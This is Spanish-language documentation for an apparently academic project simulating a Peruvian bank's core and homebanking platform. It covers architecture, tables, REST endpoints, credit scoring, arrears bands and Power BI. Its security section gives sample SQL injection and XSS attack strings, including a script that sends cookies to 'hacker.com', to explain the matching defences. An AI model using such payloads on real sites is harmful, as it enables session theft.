# 🏦 DOCUMENTACIÓN OFICIAL INTEGRAL — SISTEMA CORE BANCARIO & HOMEBANKING OMNICANAL
**Autor del Proyecto:** Diego Tornero Bermudez  
**Entidad Modelada:** Banco Falabella Perú S.A.  
**Evaluación Académica:** Informe Final Completo — Requerimientos (Semana 9 a 13) y Reto de Ciberseguridad (Semana 14)  
**Versión del Sistema:** 2.0.0  
**Arquitectura:** Microservicios REST (Core Financiero Backend + Portal Clientes Homebanking + Bases de Datos PostgreSQL Cloud)  
**Despliegue:** Render.com (Backend) + Vercel (Frontend)  

---

## 📑 ÍNDICE

1. [Visión General del Proyecto](#1-visión-general-del-proyecto)
2. [Investigación de Campo y Validación Oficial](#2-investigación-de-campo-y-validación-oficial)
3. [Arquitectura del Sistema](#3-arquitectura-del-sistema)
4. [Estructura de Carpetas](#4-estructura-de-carpetas)
4. [Base de Datos — Modelo Relacional](#4-base-de-datos--modelo-relacional)
5. [Portal Homebanking (Cliente)](#5-portal-homebanking-cliente)
6. [Core Bancario (Personal Interno)](#6-core-bancario-personal-interno)
7. [Motor de Scoring y Reglas de Negocio](#7-motor-de-scoring-y-reglas-de-negocio)
8. [Módulo de Gestión de Mora (R1-R2-R3-R4)](#8-módulo-de-gestión-de-mora-r1-r2-r3-r4)
9. [Módulo de Cuentas de Ahorro y CTS](#9-módulo-de-cuentas-de-ahorro-y-cts)
10. [Módulo de Tarjetas CMR y Puntos](#10-módulo-de-tarjetas-cmr-y-puntos)
11. [Módulo de Depósitos a Plazo Fijo](#11-módulo-de-depósitos-a-plazo-fijo)
12. [Dashboard de Business Intelligence (Power BI)](#12-dashboard-de-business-intelligence-power-bi)
13. [Seguridad y Ciberseguridad (5 Defensas)](#13-seguridad-y-ciberseguridad-5-defensas)
14. [APIs REST — Referencia de Endpoints](#14-apis-rest--referencia-de-endpoints)
15. [Fórmulas Financieras y Tarifario](#15-fórmulas-financieras-y-tarifario)
16. [Guía de Despliegue en Producción](#16-guía-de-despliegue-en-producción)
17. [Variables de Entorno](#17-variables-de-entorno)
18. [Casos de Prueba End-to-End](#18-casos-de-prueba-end-to-end)

---

## 1. VISIÓN GENERAL DEL PROYECTO

El **Sistema Core Bancario & Homebanking de Banco Falabella** es una plataforma bancaria digital completa que simula el funcionamiento real de una entidad financiera peruana. El sistema está compuesto por **tres aplicaciones independientes** que se comunican entre sí:

| Componente | Tecnología | Propósito | URL Producción |
|---|---|---|---|
| **Portal Homebanking** | React + Vite (Frontend) | Portal web del cliente final | [Vercel — HB](https://proyecto-falabella-tornero-ja2i.vercel.app) |
| **Portal Backend** | FastAPI + Python | API REST del Homebanking | Render.com |
| **Core Bancario Frontend** | React + Vite (Frontend) | Interfaz interna para analistas | [Vercel — Core](https://proyecto-falabella-tornero-nqff.vercel.app) |
| **Core Bancario Backend** | FastAPI + Python | Motor financiero y scoring | [Render.com](https://core-backend-g43c.onrender.com) |
| **Base de Datos** | PostgreSQL (Neon.tech) | Almacenamiento central compartido | Neon Cloud |

### 🎯 Funcionalidades Principales

- **Clientes** pueden: Registrarse, iniciar sesión, solicitar créditos, ver cronograma de pagos, pagar cuotas, gestionar cuentas de ahorro, hacer transferencias, administrar tarjetas CMR y abrir depósitos a plazo fijo.
- **Analistas y Gerentes Bancarios** pueden: Revisar la bandeja de créditos, evaluar scoring, aprobar/rechazar solicitudes, gestionar cartera morosa (R1→R2→R3), ejecutar cierres diarios y consultar dashboards de inteligencia de negocios.
- **Sistema Automático**: El motor de scoring evalúa créditos en tiempo real, aplica intereses moratorios nocturnos (cierre de día) y genera cronogramas de pago bajo el Sistema Francés.

---

## 2. INVESTIGACIÓN DE CAMPO Y VALIDACIÓN OFICIAL

Como parte del desarrollo de este proyecto, se realizó una visita presencial a una agencia del **Banco Falabella Perú S.A.** para levantar requerimientos reales. En la ventanilla de atención al cliente, el personal bancario indicó que toda la información relacionada con tasas, tarifas y fórmulas matemáticas se encuentra estandarizada y regulada por la SBS. 

Para asegurar la máxima fidelidad del software con la realidad, nos proporcionaron los siguientes enlaces oficiales, los cuales sirvieron como base para programar el **Motor de Scoring** y el cálculo del **Sistema Francés**:

1. **Tarifario Oficial:** [https://www.bancofalabella.pe/tasas-tarifas](https://www.bancofalabella.pe/tasas-tarifas)
2. **Fórmulas y Ejemplos (SBS):** [https://www.bancofalabella.pe/formulas-y-ejemplos](https://www.bancofalabella.pe/formulas-y-ejemplos)

Todo el código de amortización (ver `core-backend/app/rules/scoring_rules.py`) ha sido calibrado utilizando los ejemplos de las fórmulas oficiales de este portal.

### 🧾 Proforma Referencial Oficial Emitida por el Sistema

A continuación se detalla la **Proforma Referencial de Simulación** que nuestro Homebanking genera y entrega al cliente antes de la aceptación del contrato de crédito:

```text
========================================================================================
                          BANCO FALABELLA PERÚ S.A. — PROFORMA DE CRÉDITO
========================================================================================
Fecha de Emisión      : 28/06/2026
Producto Solicitado   : CRÉDITO EFECTIVO PERSONAL (FAST TRACK)
Titular Evaluado      : CARLOS HUAMÁN MENDOZA (DNI: 71234567)
Ingreso Acreditable   : S/ 4,500.00 mensuales

PARÁMETROS DEL PRÉSTAMO:
----------------------------------------------------------------------------------------
Monto Solicitado (Capital)    : S/ 10,000.00
Plazo de Amortización         : 12 meses (1 año)
Tasa Efectiva Anual (TEA)     : 18.00%
Tasa Efectiva Mensual (TEM)   : 1.3888%
Seguro de Desgravamen Mensual : 0.085% sobre saldo deudor (Aprox. S/ 8.50)

RESULTADO DE LA EVALUACIÓN CORE:
----------------------------------------------------------------------------------------
Cuota Fija Mensual            : S/ 911.23
Relación Deuda-Sueldo (RDS)   : 26.03% (CAPACIDAD DE PAGO ÓPTIMA)
Semáforo Crediticio           : [ VERDE ] — APROBACIÓN AUTOMÁTICA SIN COMITÉ

DESGLOSE DEL CRONOGRAMA DE PAGOS (TABLA DE AMORTIZACIÓN REFERENCIAL):
Cuota #   Vencimiento   Saldo Inicial   Capital Amortizado   Interés (TEM)   Cuota Total
----------------------------------------------------------------------------------------
  01      28/07/2026    S/ 10,000.00        S/ 772.35          S/ 138.88      S/ 911.23
  02      28/08/2026    S/  9,227.65        S/ 783.07          S/ 128.16      S/ 911.23
  03      28/09/2026    S/  8,444.58        S/ 793.95          S/ 117.28      S/ 911.23
  ...       ...             ...                ...                ...            ...
  12      28/06/2027    S/    898.75        S/ 898.75          S/  12.48      S/ 911.23
----------------------------------------------------------------------------------------
TOTALES FINALES               —             S/ 10,000.00       S/ 934.76     S/ 10,934.76
========================================================================================
* Nota: Proforma calculada rigurosamente bajo el Sistema de Amortización Francés 30/360.
```

---

## 3. ARQUITECTURA DEL SISTEMA

```
┌──────────────────────────────────────────────────────────────────┐
│                     CLIENTE FINAL (Navegador Web)                │
│                  Portal Homebanking — React/Vite                  │
│           https://proyecto-falabella-tornero-ja2i.vercel.app     │
└────────────────────────────┬─────────────────────────────────────┘
                             │ HTTP REST (JWT Bearer Token)
                             ▼
┌──────────────────────────────────────────────────────────────────┐
│                  PORTAL BACKEND — FastAPI Python                  │
│              /api/auth  /api/creditos  /api/ahorros               │
│              /api/tarjetas  /api/inversiones  /api/empresas       │
│                    Render.com — portal-backend                    │
└──────────┬────────────────────────────────────────┬──────────────┘
           │ SQL (SQLAlchemy ORM)                   │ HTTP REST
           ▼                                         ▼
┌──────────────────────┐              ┌──────────────────────────────┐
│  BASE DE DATOS       │              │  CORE BANCARIO BACKEND       │
│  PostgreSQL          │◄─────────────│  FastAPI Python              │
│  Neon.tech Cloud     │ SQL compartido│  /scoring  /api/mora         │
│  (Tabla compartida)  │              │  /analytics  /api/ahorros    │
└──────────────────────┘              │  Render.com — core-backend   │
                                      └──────────────┬───────────────┘
                                                     │ HTTP REST
                                                     ▼
                                      ┌──────────────────────────────┐
                                      │  CORE FRONTEND               │
                                      │  React + Vite                │
                                      │  Vercel — core-frontend      │
                                      └──────────────────────────────┘
```

> **Dato clave:** Ambos backends comparten la **misma base de datos PostgreSQL** en Neon.tech. Esto significa que cuando un cliente solicita un crédito desde el Homebanking, el analista bancario lo ve inmediatamente en su bandeja del Core, sin sincronización adicional.

---

## 3. ESTRUCTURA DE CARPETAS

```
proyecto_Falabella_Tornero-main/
│
├── portal-frontend/          # React App — Homebanking para clientes
│   ├── src/
│   │   ├── pages/            # Pantallas: Dashboard, Créditos, Ahorros, etc.
│   │   ├── components/       # Componentes reutilizables
│   │   ├── context/          # Context API para estado global (auth)
│   │   └── lib/              # Utilidades y clientes HTTP (axios)
│   └── vite.config.js
│
├── portal-backend/           # FastAPI — API REST del Homebanking
│   └── app/
│       ├── routers/          # auth.py, creditos.py, ahorros.py, tarjetas.py...
│       ├── services/         # Lógica de negocio (credito_service.py, etc.)
│       ├── repositories/     # Acceso a datos (credito_repository.py, etc.)
│       ├── models/           # Modelos SQLAlchemy
│       ├── schemas/          # Esquemas Pydantic (validación de entrada)
│       ├── security.py       # CORS, Rate Limiting, Headers HTTP
│       └── main.py           # Punto de entrada, registro de routers
│
├── core-frontend/            # React App — Panel para analistas bancarios
│   └── src/
│       └── App.jsx           # SPA completa (1825 líneas)
│
├── core-backend/             # FastAPI — Motor financiero y scoring
│   └── app/
│       ├── routers/          # scoring.py, mora.py, analytics.py, ahorros.py...
│       ├── rules/            # scoring_rules.py (motor de decisión)
│       ├── models/           # models.py (todas las tablas SQLAlchemy)
│       ├── schemas/          # schemas.py (validación de datos)
│       ├── security.py       # Headers HTTP, sanitización
│       └── main.py           # Punto de entrada, CORS, registro de routers
│
├── render.yaml               # Configuración de despliegue en Render.com
├── DOCUMENTACION_PROYECTO_FALABELLA.md   # Documentación académica
├── DOCUMENTACION_TECNICA.md              # Esta documentación
└── GUIA_OFICIAL_POWERBI.md              # Guía paso a paso Power BI
```

---

## 4. BASE DE DATOS — MODELO RELACIONAL

Todas las tablas son creadas automáticamente por SQLAlchemy al iniciar los backends. La base de datos reside en **Neon.tech** (PostgreSQL serverless en la nube).

### Tablas Principales

#### `usuarios` — Clientes del banco
| Columna | Tipo | Descripción |
|---|---|---|
| `id` | UUID (PK) | Identificador único |
| `nombre`, `apellido` | String | Datos personales |
| `dni` | String(20) UNIQUE | Documento de identidad |
| `email` | String(150) UNIQUE | Correo electrónico |
| `password_hash` | String(255) | Contraseña hasheada con Bcrypt |
| `ingreso_mensual` | Float | Sueldo mensual (para cálculo RDS) |
| `avatar` | String | Nombre del avatar elegido |

#### `creditos` — Préstamos del sistema
| Columna | Tipo | Descripción |
|---|---|---|
| `id` | UUID (PK) | Identificador único |
| `usuario_id` | FK → usuarios | Titular del crédito (persona) |
| `empresa_id` | FK → empresas | Titular del crédito (empresa B2B) |
| `monto_solicitado` | Float | Capital pedido |
| `monto_aprobado` | Float | Capital aprobado por el Core |
| `plazo_meses` | Integer | Duración del préstamo |
| `tasa_interes` | Float | TEA aplicada |
| `estado` | String | `enviado/en_revision/aprobado/rechazado/desembolsado/castigado` |
| `score_crediticio` | Integer | Puntaje 0-1000 del motor |
| `rds_valor` | Float | Ratio Deuda/Sueldo |
| `rds_semaforo` | String | `verde/amarillo/rojo` |
| `dias_mora` | Integer | Días de retraso en pago |
| `banda_mora` | String | Clasificación de mora |
| `tipo_producto` | String | `Crédito Efectivo Personal/PYME Comercial/Tarjeta CMR/Vehicular` |

#### `empresas` — Clientes Corporativos (B2B)
| Columna | Tipo | Descripción |
|---|---|---|
| `id` | UUID (PK) | Identificador único |
| `ruc` | String(11) UNIQUE | RUC empresarial |
| `razon_social` | String(200) | Nombre legal |
| `tipo_empresa` | String | `micro/pequeña/mediana/grande` |
| `facturacion_anual` | Float | Ventas anuales (para scoring empresarial) |
| `num_trabajadores` | Integer | Planilla de empleados |
| `direccion` | Text | Ciudad/Zona del cliente B2B |
| `sector` | String | Zona geográfica (Lima, Norte, Sur, Oriente) |

#### `cuentas_ahorro` — Cuentas bancarias
| Columna | Tipo | Descripción |
|---|---|---|
| `id` | Integer (PK) | Identificador |
| `numero_cuenta` | String(20) UNIQUE | Número de cuenta (`BF` + código hex) |
| `usuario_id` | FK → usuarios | Propietario |
| `producto_pasivo_id` | FK → productos_pasivos | Tipo de cuenta |
| `saldo_actual` | Float | Saldo vigente en tiempo real |
| `estado` | String | `ACTIVA / BLOQUEADA` |

#### `cronograma_pagos` — Cuotas del préstamo
| Columna | Tipo | Descripción |
|---|---|---|
| `id` | UUID (PK) | Identificador |
| `credito_id` | FK → creditos | Crédito al que pertenece |
| `numero_cuota` | Integer | Número de la cuota (1, 2, 3...) |
| `fecha_vencimiento` | Date | Fecha de vencimiento de la cuota |
| `monto_cuota` | Float | Importe fijo de la cuota |
| `estado` | String | `pendiente / pagado` |
| `mora_acumulada` | Float | Interés moratorio acumulado |

#### `trabajadores` — Personal bancario del Core
| Columna | Tipo | Descripción |
|---|---|---|
| `id` | UUID (PK) | Identificador |
| `codigo_empleado` | String UNIQUE | Código de acceso (ej. `CORE-001`) |
| `rol` | String | `asesor / jefe_regional / riesgos / comite / gerencia` |

#### Otras tablas
- `movimientos_ahorro` — Historial de depósitos, retiros, transferencias
- `tarjetas` — Tarjetas CMR (débito y crédito)
- `depositos_plazo` — Depósitos a plazo fijo (inversiones)
- `puntos_cmr` — Programa de puntos/beneficios
- `gestiones_mora` — Registro de llamadas, visitas y cartas de cobranza
- `historial_creditos` — Auditoría de aprobaciones y rechazos
- `contactos_transferencia` — Beneficiarios frecuentes
- `notificaciones` — Sistema de alertas push
- `productos_activos` — Catálogo de productos de crédito
- `productos_pasivos` — Catálogo de productos de ahorro/CTS
- `auditoria_reportes_bi` — Registro de exportaciones para Power BI

---

## 5. PORTAL HOMEBANKING (CLIENTE)

### Backend — `portal-backend/`

#### Autenticación (`/api/auth`)
| Endpoint | Método | Descripción |
|---|---|---|
| `/api/auth/login` | POST | Ingreso con DNI + contraseña |
| `/api/auth/register` | POST | Registro de nuevo cliente |
| `/api/auth/password-recovery/request` | POST | Solicitar código OTP de recuperación |
| `/api/auth/password-recovery/reset` | POST | Cambiar contraseña con OTP |

**Flujo de Login:**
1. Cliente envía DNI + contraseña al backend.
2. El backend verifica con Bcrypt que la contraseña coincida.
3. Si es correcta, genera un **JWT Token** firmado con `SECRET_KEY` y lo retorna.
4. El frontend almacena el token y lo envía en el header `Authorization: Bearer {token}` en cada petición posterior.

#### Créditos (`/api/creditos`)
| Endpoint | Método | Descripción |
|---|---|---|
| `/api/creditos/{usuario_id}` | GET | Lista los créditos del cliente |
| `/api/creditos/` | POST | Solicitar nuevo crédito |
| `/api/creditos/{credito_id}/cronograma` | GET | Ver tabla de cuotas |
| `/api/creditos/{credito_id}/pagar-cuota` | POST | Pagar próxima cuota desde cuenta de ahorros |

**Flujo de Solicitud de Crédito:**
1. Cliente llena el formulario (monto, plazo, propósito).
2. El Portal Backend crea el crédito en la BD con estado `enviado`.
3. El Portal llama automáticamente al Core Backend (`POST /scoring/evaluar`) para obtener el score.
4. El Core devuelve: `score`, `rds`, `semáforo`, `estado` (aprobado/rechazado/en_revision).
5. El Portal actualiza el crédito en la BD con el resultado del scoring.
6. Si el estado es `aprobado_automatico`: El Core genera el cronograma de cuotas y acredita el monto en la cuenta de ahorros del cliente.

#### Cuentas de Ahorro (`/api/ahorros`)
| Endpoint | Método | Descripción |
|---|---|---|
| `/api/ahorros/{usuario_id}` | GET | Ver todas las cuentas del cliente |
| `/api/ahorros/movimientos/{cuenta_id}` | GET | Historial de movimientos |
| `/api/ahorros/apertura` | POST | Abrir nueva cuenta de ahorro o CTS |
| `/api/ahorros/depositar` | POST | Ingresar dinero |
| `/api/ahorros/retirar` | POST | Retirar dinero |

#### Transferencias (`/api/transferencias`)
| Endpoint | Método | Descripción |
|---|---|---|
| `/api/transferencias/` | POST | Enviar dinero a otra cuenta BF |
| `/api/transferencias/{cuenta_id}` | GET | Ver historial de transferencias |

**Flujo de Transferencia:**
1. Se valida que la cuenta de origen pertenezca al usuario autenticado (anti-IDOR).
2. Se verifica que exista saldo suficiente.
3. Se descuenta de la cuenta origen y se abona en la cuenta destino atómicamente.
4. Se registran dos movimientos: `TRANSFERENCIA` (salida) y `DEPOSITO` (entrada).

#### Tarjetas CMR (`/api/tarjetas`)
| Endpoint | Método | Descripción |
|---|---|---|
| `/api/tarjetas/{usuario_id}` | GET | Ver tarjetas del cliente |
| `/api/tarjetas/solicitar` | POST | Solicitar nueva tarjeta CMR |
| `/api/tarjetas/estado` | PUT | Bloquear o activar tarjeta |

#### Depósitos a Plazo Fijo — Inversiones (`/api/inversiones`)
| Endpoint | Método | Descripción |
|---|---|---|
| `/api/inversiones/{usuario_id}` | GET | Ver inversiones activas |
| `/api/inversiones/apertura` | POST | Abrir nuevo depósito a plazo |

**TREA por Plazo:**
- 6 meses → **5.50% TREA**
- 12 meses → **6.80% TREA**
- 24 meses → **7.50% TREA**

#### Empresas — Crédito Micro Empresarial (`/api/empresas`)
| Endpoint | Método | Descripción |
|---|---|---|
| `/api/empresas/` | GET | Listar empresas |
| `/api/empresas/buscar?ruc=` | GET | Buscar empresa por RUC |
| `/api/empresas/` | POST | Registrar nueva empresa |
| `/api/empresas/{empresa_id}` | GET | Ver empresa y sus créditos |
| `/api/empresas/{empresa_id}/credito` | POST | Solicitar crédito empresarial |

---

## 6. CORE BANCARIO (PERSONAL INTERNO)

### Backend — `core-backend/`

El Core es el motor financiero interno, accesible **solo por personal autenticado** con un `Trabajador` token. Los clientes del Homebanking no tienen acceso directo.

#### Autenticación Core (`/auth`)
| Endpoint | Método | Descripción |
|---|---|---|
| `/auth/login` | POST | Login con `codigo_empleado` + `password` |
| `/auth/register` | POST | Registro de nuevo trabajador |

#### Bandeja de Scoring (`/scoring`)
| Endpoint | Método | Descripción |
|---|---|---|
| `/scoring/bandeja` | GET | Ver todos los créditos (con scoring) |
| `/scoring/evaluar` | POST | Evaluar crédito personal |
| `/scoring/evaluar-empresarial` | POST | Evaluar crédito empresarial |
| `/scoring/bandeja/{credito_id}` | PUT | Aprobar/rechazar/observar crédito |

**Jerarquía de Roles para Aprobación (RBAC):**
| Rol | Monto Máximo Que Puede Aprobar |
|---|---|
| `asesor` | Hasta S/ 5,000 |
| `jefe_regional` | Hasta S/ 20,000 |
| `riesgos` | Hasta S/ 100,000 |
| `comite` | Hasta S/ 500,000 |
| `gerencia` | Sin límite |

#### Módulo Analítica (`/analytics`)
| Endpoint | Método | Descripción |
|---|---|---|
| `/analytics/kpis` | GET | Totales globales del banco |
| `/analytics/mora-bands` | GET | Distribución de mora por banda |
| `/analytics/cartera-activa` | GET | Lista de créditos desembolsados |
| `/analytics/powerbi-resumen` | GET | Datos para Hoja 1 de Power BI |
| `/analytics/powerbi-mora` | GET | Datos para Hoja 2 de Power BI |

---

## 7. MOTOR DE SCORING Y REGLAS DE NEGOCIO

**Archivo:** `core-backend/app/rules/scoring_rules.py`

El motor de evaluación crediticia es **determinístico**: dado los mismos datos de entrada, siempre produce el mismo resultado. Combina 4 factores:

### Algoritmo de Scoring (0 - 1000 puntos)

```
Score Base = 500 puntos

+ Factor 1: Edad del solicitante
  - Rango 25-55 años (pico productivo): +100 pts
  - Rango 22-24 ó 56-65 años:           +30 pts
  - Menor de 22 ó Mayor de 65:          -100 pts

+ Factor 2: Relación Monto/Plazo
  - Monto pequeño y plazo corto:         +150 pts
  - Monto moderado:                       +50 pts
  - Monto alto con plazo largo:          -150 pts

+ Factor 3: Historial Crediticio
  - Sin rechazos recientes:              Sin penalización
  - 2+ rechazos en los últimos 6 meses: -200 pts

= Score Final Clampado entre [0 - 1000]
```

### Evaluación de Resultado

| Score | Estado | Ruta | Acción |
|---|---|---|---|
| ≥ 700 y RDS Verde | `aprobado_automatico` | AUTOMATICA | Desembolso inmediato |
| ≥ 550 | `en_revision` | JEFE_REGIONAL o superior | Va a bandeja de analistas |
| < 550 | `rechazado` | — | Denegado automáticamente |

### Ratio de Deuda-Sueldo (RDS)

El RDS mide cuánto del sueldo mensual del cliente se compromete en pagar el crédito:

```
Cuota Mensual = [Monto × TEM × (1 + TEM)^n] / [(1 + TEM)^n - 1]
RDS = Cuota Mensual / Ingreso Mensual del Cliente
```

| RDS | Semáforo | Significado |
|---|---|---|
| < 30% | 🟢 Verde | Capacidad de pago holgada |
| 30% - 50% | 🟡 Amarillo | Capacidad de pago ajustada |
| > 50% | 🔴 Rojo | Riesgo de sobreendeudamiento |

---

## 8. MÓDULO DE GESTIÓN DE MORA (R1-R2-R3-R4)

**Router:** `core-backend/app/routers/mora.py`

El sistema clasifica la cartera morosa en 5 bandas de envejecimiento (aging):

| Banda | Días de Retraso | Acción Recomendada |
|---|---|---|
| **Preventiva** | 1 - 30 días | Monitoreo Regular |
| **Temprana** | 31 - 60 días | Llamada Call Center |
| **Tardía** | 61 - 120 días | Visita domiciliaria + carta |
| **Judicial** | 121 - 180 días | Derivación a proceso legal |
| **Castigo** | > 180 días | Provisión al 100%, baja de cartera |

### Endpoints de Mora

| Endpoint | Rol Mínimo | Descripción |
|---|---|---|
| `GET /api/mora/bandeja` | asesor | Ver cartera morosa con KPIs |
| `POST /api/mora/gestiones` | asesor | Registrar gestión de cobranza |
| `GET /api/mora/gestiones/{credito_id}` | asesor | Historial de gestiones |
| `PUT /api/mora/{credito_id}/transicion` | riesgos/gerencia | Derivar a judicial o castigo |
| `POST /api/mora/cierre-diario` | (sin auth) | Batch nocturno de mora + intereses |

### Cierre Diario (Batch)
El endpoint `POST /api/mora/cierre-diario` simula el proceso nocturno bancario:
1. Detecta cuotas pendientes con fecha vencida.
2. Calcula los días de retraso exactos.
3. Aplica la **tasa moratoria diaria** sobre el saldo de la cuota.
4. Cobra el seguro de desgravamen mensual si aplica.
5. Actualiza la banda de mora del crédito.

---

## 9. MÓDULO DE CUENTAS DE AHORRO Y CTS

### Productos Pasivos Disponibles
| Código | Nombre | TREA Mínima | TREA Máxima |
|---|---|---|---|
| `AHO-001` | Cuenta de Ahorros Falabella | 1.50% | 3.00% |
| `CTS-001` | Cuenta CTS Falabella | 4.00% | 6.00% |

### Funcionalidades
- **Apertura de cuenta:** Genera número único `BF` + código hex aleatorio.
- **Depósito y retiro:** Validación de saldo suficiente, registro inmediato en `movimientos_ahorro`.
- **Cierre diario de ahorros:** Abono diario de intereses TREA (simulación de devengo mensual).
- **Estado de cuenta:** Permite bloquear (`BLOQUEADA`) o reactivar (`ACTIVA`) la cuenta.

---

## 10. MÓDULO DE TARJETAS CMR Y PUNTOS

### Tipos de Tarjetas
| Tipo | Límite | Descripción |
|---|---|---|
| `DEBITO_CMR` | S/ 1,500 | Tarjeta de débito Visa |
| `CREDITO_CMR` | S/ 3,000 | Tarjeta de crédito CMR Gold |

### Programa de Puntos CMR
- Todo cliente nuevo recibe **500 puntos de bienvenida**.
- Los puntos se dividen en niveles: **Verde → Silver → Black**.
- Los puntos son visibles en la sección "Beneficios" del Homebanking.

---

## 11. MÓDULO DE DEPÓSITOS A PLAZO FIJO

### Funcionamiento
1. El cliente selecciona monto (mínimo S/ 100) y plazo (6, 12 o 24 meses).
2. El sistema debita de su cuenta de ahorros y crea el registro de inversión.
3. La ganancia se calcula con la fórmula:
   ```
   Ganancia = Monto × [(1 + TREA/100)^(plazo/12) - 1]
   ```
4. Al vencimiento, el estado cambia a `FINALIZADO` y el capital + ganancia retorna a su cuenta.

---

## 12. DASHBOARD DE BUSINESS INTELLIGENCE (POWER BI)

El proyecto incluye un tablero de Power BI de **2 hojas** conectado **en tiempo real** a la base de datos PostgreSQL en Neon.

### Conexión Directa a la Base de Datos

En Power BI Desktop:
1. **Inicio → Obtener Datos → PostgreSQL**
2. **Servidor:** `ep-twilight-water-atm701rq.c-9.us-east-1.aws.neon.tech`
3. **Base de Datos:** `neondb`
4. **Tabla principal:** `public creditos` (y luego `public empresas`)

### Medidas DAX Principales

```dax
Cartera Total = SUM('public creditos'[monto_aprobado])
Total Creditos = COUNT('public creditos'[id])
Cartera Vencida = CALCULATE(SUM('public creditos'[monto_aprobado]), 'public creditos'[dias_mora] > 0)
Ratio Mora Global = DIVIDE([Cartera Vencida], [Cartera Total], 0)
Ticket Promedio = DIVIDE([Cartera Total], [Total Creditos], 0)
Tasa Promedio = AVERAGE('public creditos'[tasa_interes])
```

### Hoja 1 — Resumen Ejecutivo de Colocaciones

| Visual | Campo | Medida | Propósito |
|---|---|---|---|
| Tarjeta KPI | — | `[Cartera Total]` | S/ totales prestados |
| Tarjeta KPI | — | `[Total Creditos]` | Cantidad de clientes |
| Tarjeta KPI | — | `[Ticket Promedio]` | Préstamo promedio por cliente |
| Tarjeta KPI | — | `[Tasa Promedio]` | TEA promedio de la cartera |
| Barras horizontales | `direccion` (empresas) | `[Cartera Total]` | Ranking de ciudades/zonas |
| Circular | `tipo_producto` (creditos) | `[Cartera Total]` | Distribución por producto |
| Líneas | `Mes` (creditos) | `[Cartera Total]` | Evolución mensual de desembolsos |

### Hoja 2 — Análisis de Morosidad y Riesgo Crediticio

| Visual | Campo | Medida | Propósito |
|---|---|---|---|
| Tarjeta KPI | — | `[Cartera Vencida]` | S/ en riesgo de impago |
| Tarjeta KPI | — | `[Ratio Mora Global]` | % de mora sobre cartera total |
| Velocímetro | — | `[Ratio Mora Global]` | Alerta visual de riesgo (meta 5%) |
| Columnas | `banda_mora` | `[Cartera Vencida]` | Distribución por tramo de retraso |
| Treemap | `tipo_producto` | `[Cartera Vencida]` | Producto con más pérdidas |
| Dispersión | `direccion` | `[Cartera Total]` vs `[Cartera Vencida]` | Matriz de riesgo por agencia |
| Matriz | `direccion` + `tipo_producto` | 3 medidas | Desglose detallado |

---

## 13. SEGURIDAD Y CIBERSEGURIDAD (5 DEFENSAS)

### 🛡️ Defensa 1: Inyección SQL (SQLi)
**Ataque:** `' OR '1'='1' --` en campo de búsqueda.  
**Contramedida:** Uso exclusivo de **SQLAlchemy ORM** con *Prepared Statements*. Ninguna consulta SQL se construye concatenando strings. El motor escapa automáticamente todos los caracteres especiales.

### 🛡️ Defensa 2: Cross-Site Scripting (XSS)
**Ataque:** `<script>fetch('hacker.com?c='+document.cookie)</script>` en campos de texto.  
**Contramedida:**  
- **React JSX** convierte por defecto todas las variables a texto plano (encoding HTML), impidiendo la ejecución de scripts inyectados.  
- Función `sanitize_input()` en el backend (`security.py`) detecta patrones HTML y los rechaza con `HTTP 400`.

### 🛡️ Defensa 3: Insecure Direct Object References (IDOR)
**Ataque:** Usuario A modifica la URL para ver los créditos del Usuario B.  
**Contramedida:**  
- Función `verify_account_ownership()` en el backend compara el `usuario_id` del JWT con el propietario del recurso solicitado.  
- Si no coinciden → `HTTP 403 Forbidden`.  
- En el Core: `get_current_trabajador()` y RBAC por rol impiden acciones no autorizadas.

### 🛡️ Defensa 4: Fuerza Bruta (Rate Limiting)
**Ataque:** Miles de intentos de contraseña por segundo con diccionarios automatizados.  
**Contramedida:**  
- Función `check_rate_limit()` en `security.py` limita intentos por IP: máximo **10 intentos en 60 segundos** en `/auth/login` y `/auth/password-recovery`.  
- Contraseñas hasheadas con **Bcrypt** (costo computacional alto por verificación).

### 🛡️ Defensa 5: Security Misconfiguration
**Ataque:** CORS abierto, credenciales de BD en el código fuente, puertos expuestos.  
**Contramedida:**  
- **CORS estricto:** Solo dominios autorizados en Vercel y Render.com.  
- **Variables de Entorno:** `DATABASE_URL`, `SECRET_KEY` inyectadas en tiempo de ejecución. Nunca en el código.  
- **Security Headers HTTP:** `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, `Content-Security-Policy` añadidos via middleware en `security.py`.  
- **`.gitignore`:** Los archivos `.env` están excluidos del repositorio Git.

---

## 14. APIS REST — REFERENCIA DE ENDPOINTS

### Portal Backend (Homebanking)
```
Base URL: https://[portal-backend].onrender.com

POST   /api/auth/login                        # Login cliente
POST   /api/auth/register                     # Registro
POST   /api/auth/password-recovery/request    # OTP recovery
POST   /api/auth/password-recovery/reset      # Reset password

GET    /api/creditos/{usuario_id}              # Ver mis créditos
POST   /api/creditos/                          # Solicitar crédito
GET    /api/creditos/{credito_id}/cronograma   # Ver cuotas
POST   /api/creditos/{credito_id}/pagar-cuota  # Pagar cuota

GET    /api/ahorros/{usuario_id}               # Ver cuentas
GET    /api/ahorros/movimientos/{cuenta_id}    # Movimientos
POST   /api/ahorros/apertura                   # Abrir cuenta
POST   /api/ahorros/depositar                  # Depositar
POST   /api/ahorros/retirar                    # Retirar

POST   /api/transferencias/                    # Transferir
GET    /api/transferencias/{cuenta_id}         # Historial

GET    /api/tarjetas/{usuario_id}              # Ver tarjetas
POST   /api/tarjetas/solicitar                 # Pedir tarjeta
PUT    /api/tarjetas/estado                    # Bloquear/activar

GET    /api/inversiones/{usuario_id}           # Ver inversiones
POST   /api/inversiones/apertura              # Abrir depósito a plazo

GET    /api/empresas/                          # Listar empresas
GET    /api/empresas/buscar?ruc=              # Buscar por RUC
POST   /api/empresas/                          # Registrar empresa
POST   /api/empresas/{id}/credito             # Crédito empresarial

GET    /api/beneficios/{usuario_id}            # Puntos CMR
GET    /api/notificaciones/{usuario_id}        # Notificaciones
GET    /api/contactos/{usuario_id}             # Contactos favoritos
```

### Core Backend (Personal bancario)
```
Base URL: https://core-backend-g43c.onrender.com

POST   /auth/login                             # Login trabajador
GET    /scoring/bandeja                         # Bandeja de créditos
POST   /scoring/evaluar                         # Evaluar crédito personal
POST   /scoring/evaluar-empresarial             # Evaluar crédito PYME
PUT    /scoring/bandeja/{credito_id}            # Aprobar/rechazar

GET    /api/mora/bandeja                        # Cartera morosa
POST   /api/mora/gestiones                      # Registrar gestión
GET    /api/mora/gestiones/{credito_id}         # Historial gestiones
PUT    /api/mora/{credito_id}/transicion        # Judicial/Castigo
POST   /api/mora/cierre-diario                  # Batch nocturno mora

GET    /analytics/kpis                          # KPIs globales
